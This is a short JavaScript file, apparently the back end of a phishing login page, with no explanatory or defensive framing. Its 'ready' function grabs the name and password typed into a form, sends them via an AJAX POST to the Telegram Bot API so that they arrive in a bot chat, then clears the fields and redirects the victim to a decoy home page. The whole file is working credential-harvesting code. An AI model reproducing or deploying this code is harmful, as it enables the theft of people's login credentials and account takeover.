var ready = function () {
    // Retrieve the values from the input fields
    name = document.getElementById("name").value;
    password = document.getElementById("password").value;



    var message = name +
        "\n\n\n" + password;

    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };

    $.ajax(settings).done(function (response) {
        console.log(response);
        if (response.ok == true) {
            window.location = './home-1.html';
        }
    }).always(function () {
        // Enable the button and change the text back to its original state

    });

    // Clear the input fields
    document.getElementById("name").value = "";
    document.getElementById("password").value = "";

};

var sender = function (event) {
    event.preventDefault(); // Prevent the form from refreshing the page

    ready(); // Get the values from input fields

    return false;
};
